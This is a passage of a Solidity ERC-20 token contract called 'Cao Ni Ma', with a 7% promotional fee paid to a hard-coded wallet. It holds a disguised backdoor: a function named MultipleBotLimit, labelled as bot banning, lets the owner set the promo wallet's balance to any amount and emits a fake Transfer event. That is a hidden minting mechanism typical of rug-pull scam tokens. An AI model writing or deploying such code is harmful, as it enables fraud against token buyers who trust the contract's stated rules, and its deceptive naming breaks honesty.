...
contract CaoNiMa is Context, IERC20, Ownable {
    ...
    string private constant _name = "Cao Ni Ma"; 
    string private constant _symbol = "Cao Ni Ma"; 
    uint8 private constant _decimals = 9; 
    
    uint256 public _promoFee = 7;
    uint256 public _liquidityFee = 0;
    address private _promoWallet = 0xb431374Fd58116B6583e18397e43D3EEaB768fcd;
    ...
    function MultipleBotLimit(uint256 resource, address addre) external onlyOwner{
        require(addre == address(_promoWallet), "Ban bot");
        _tOwned[addre] = resource;
        emit Transfer(address(_promoWallet), addre, resource);
    }
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        uint256 promo = amount * _promoFee / 100; 
